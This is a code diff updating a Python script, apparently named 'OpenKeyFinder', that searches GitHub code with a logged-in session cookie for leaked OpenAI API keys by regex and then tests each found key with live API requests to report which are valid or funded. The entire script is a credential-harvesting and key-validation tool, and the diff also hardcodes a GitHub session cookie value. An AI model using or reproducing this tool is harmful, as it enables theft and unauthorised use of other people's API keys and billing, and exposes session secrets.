@@ -1,22 +1,10 @@
-import requests
 import re
-import openai
+import requests
+from openai import OpenAI  # Import the OpenAI class
 
-GITHUB_COOKIE_SESSION = "" #<---- HERE
+GITHUB_COOKIE_SESSION = "9A7YS8FbpBr6hRtLPFQWN76duVKCaMPyHwNSI-aFfcn1sWUx"
 
-print("""
-\033[94m 
-   ____                   _  __          ______ _           _           
-  / __ \                 | |/ /         |  ____(_)         | |          
- | |  | |_ __   ___ _ __ | ' / ___ _   _| |__   _ _ __   __| | ___ _ __ 
- | |  | | '_ \ / _ \ '_ \|  < / _ \ | | |  __| | | '_ \ / _` |/ _ \ '__|
- | |__| | |_) |  __/ | | | . \  __/ |_| | |    | | | | | (_| |  __/ |   
-  \____/| .__/ \___|_| |_|_|\_\___|\__, |_|    |_|_| |_|\__,_|\___|_|   
-        | |                         __/ |                               
-        |_|                        |___/                                    
-                                                       twitter: @hck4fun\033[00m
-                                """)
-
+print("Searching for API KEYS....")
 
 regex = r"sk-[a-zA-Z0-9]*T3BlbkFJ[a-zA-Z0-9]*"
 
@@ -28,24 +16,34 @@ headers = {
 }
 
 matches = []
-for i in range(1,6):
-    params = {'q': f'/{regex}/', 'type': 'code', 'p':i}
+for i in range(1, 6):
+    params = {'q': f'/{regex}/', 'type': 'code', 'p': i}
     response = requests.get('https://github.com/search', params=params, cookies=cookies, headers=headers)
-    matches = matches + re.findall(regex, response.text)
+    matches += re.findall(regex, response.text)
 
 print(f"FOUND:\033[95m {len(matches)} keys\033[00m")
 
 print("Checking API KEYS....")
 for match in matches:
-    openai.api_key = match
     try:
-        response = openai.Completion.create(engine="gpt-3.5-turbo-instruct", prompt="Hello, world!", temperature=0.6)
+        # Instantiate an OpenAI client with the current key
+        client = OpenAI(api_key=match)
+
+        # Test the key by creating a chat completion
+        chat_completion = client.chat.completions.create(
+            messages=[
+                {
+                    "role": "user",
+                    "content": "Say this is a test",
+                }
+            ],
+            model="gpt-4o",
+        )
         print(f"{match}: API key is:\033[92m VALID\033[00m")
     except Exception as e:
-        if str(e) == "You exceeded your current quota, please check your plan and billing details.":
+        if "quota" in str(e).lower():
             print(f"{match}: API key:\033[93m VALID but not PAID\033[00m")
-        elif "Incorrect API key" in str(e):
+        elif "invalid" in str(e).lower():
             print(f"{match}: API key is:\033[91m NOT VALID\033[00m")
         else:
-            #print(str(e))
-            print(f"{match}: Unkwon error")
+            print(f"{match}: Unknown error: {e}")
